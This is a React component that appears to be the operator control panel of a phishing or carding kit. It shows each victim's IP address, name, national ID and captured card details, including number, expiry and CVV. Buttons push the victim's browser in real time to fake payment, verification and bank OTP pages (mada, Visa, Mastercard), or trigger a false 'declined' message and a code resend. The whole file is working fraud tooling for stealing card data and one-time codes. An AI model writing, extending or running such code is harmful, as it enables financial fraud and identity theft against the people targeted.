import React from 'react';
import { UserData, AVAILABLE_PAGES } from '../../types';
import { socketService } from '../../services/socketService';
import { useI18n } from '../../shared/i18n';
import { maskCardNumberKeepFirstSix, maskSensitiveValue } from '../../shared/utils';

interface ControlPanelProps {
  user: UserData;
  onClose: () => void;
}

const ControlPanel: React.FC<ControlPanelProps> = ({ user, onClose }) => {
  const { t, isRTL } = useI18n();
  const handleNavigate = (page: string) => {
    socketService.emitDashboardEvent('navigateTo', { ip: user.ip, page });
    alert(`Command sent to navigate to ${page}`);
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-lg shadow-2xl w-full max-w-4xl max-h-[90vh] overflow-y-auto flex flex-col md:flex-row rtl:flex-row-reverse">

        {/* Sidebar / Info */}
        <div className="md:w-1/3 bg-gray-50 p-6 border-l border-gray-200">
          <div className="flex justify-between items-start mb-4">
            <h2 className="text-xl font-bold text-gray-800">{t('control')}</h2>
            <button onClick={onClose} className="text-gray-500 hover:text-red-500 text-2xl">&times;</button>
          </div>

          <div className="space-y-4">
            <div className="p-3 bg-white rounded shadow-sm border border-gray-200">
              <span className="block text-xs text-gray-500">{t('ipAddress')}</span>
              <span className="font-mono font-bold text-brand">{user.ip}</span>
            </div>

            <div className="p-3 bg-white rounded shadow-sm border border-gray-200">
              <span className="block text-xs text-gray-500">{t('name')}</span>
              <span className="font-semibold">{user.name || t('notAvailable')}</span>
            </div>

            <div className="p-3 bg-white rounded shadow-sm border border-gray-200">
              <span className="block text-xs text-gray-500">{t('nationalId')}</span>
              <span className="font-mono font-bold text-gray-700">{user.nationalID || t('notAvailable')}</span>
            </div>

            <div className="p-3 bg-white rounded shadow-sm border border-gray-200">
              <span className="block text-xs text-gray-500">{t('currentPage')}</span>
              <span className="inline-block px-2 py-1 bg-blue-100 text-blue-800 text-xs rounded-full">
                {AVAILABLE_PAGES.find(p => p.id === user.currentPage)?.label || user.currentPage}
              </span>
            </div>

            {user.payments.length > 0 && (
              <div className="p-3 bg-green-50 rounded shadow-sm border border-green-200">
                <span className="block text-xs text-green-700 font-bold mb-2">{t('paymentData')} ({user.payments.length})</span>
                {user.payments.map((p, idx) => (
                  <div key={idx} className="text-xs mb-2 pb-2 border-b border-green-100 last:border-0">
                    <div className="font-semibold mb-1 text-gray-700">{p.cardHolderName || t('notAvailable')}</div>
                    <div className="font-mono text-gray-600 mb-1 dir-ltr text-right">{maskCardNumberKeepFirstSix(p.cardNumber)}</div>
                    <div className="flex justify-between mt-1 text-gray-500">
                      <span>Exp: {p.expirationDate}</span>
                      <span>CVV: {maskSensitiveValue(p.cvv, 3)}</span>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>

        {/* Navigation Controls */}
        <div className="md:w-2/3 p-6">
          <h3 className="text-lg font-bold mb-4 text-gray-700 border-b pb-2">{t('directNavigation')}</h3>

          <div className="grid grid-cols-2 gap-4">
            {AVAILABLE_PAGES.map((page) => (
              <button
                key={page.id}
                onClick={() => handleNavigate(page.id)}
                className={`
                  p-4 rounded-lg border transition-all duration-200 flex flex-col items-center justify-center gap-2
                  ${user.currentPage === page.id
                    ? 'bg-blue-600 text-white border-blue-600 shadow-lg scale-105'
                    : 'bg-white border-gray-200 text-gray-600 hover:bg-blue-50 hover:border-blue-300'
                  }
                `}
              >
                <span className={`text-2xl ${user.currentPage === page.id ? 'text-white' : 'text-blue-500'}`}>
                  {page.id === '/home' && '🏠'}
                  {page.id === '/booking' && '📅'}
                  {page.id === '/billing' && '💳'}
                  {page.id === '/payment' && '💸'}
                  {page.id === '/verification' && '🔐'}
                  {page.id === '/mada-otp' && '📱'}
                  {page.id === '/visa-otp' && '💳'}
                  {page.id === '/mastercard-otp' && '💳'}
                  {page.id === '/finish' && '✅'}
                </span>
                <span className="font-semibold">{page.label}</span>
              </button>
            ))}
          </div>

          <div className="mt-8 p-4 bg-yellow-50 rounded-lg border border-yellow-200">
            <h4 className="font-bold text-yellow-800 mb-2">{t('quickCommands')}</h4>
            <div className="flex gap-2">
              <button
                onClick={() => handleNavigate('/payment?error=declined')}
                className="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded shadow text-sm"
              >
                {t('decline')}
              </button>
              <button
                onClick={() => handleNavigate('/verification?retry=true')}
                className="bg-orange-500 hover:bg-orange-600 text-white px-4 py-2 rounded shadow text-sm"
              >
                {t('resendCode')}
              </button>
            </div>
          </div>
        </div>

      </div>
    </div>
  );
};

export default ControlPanel;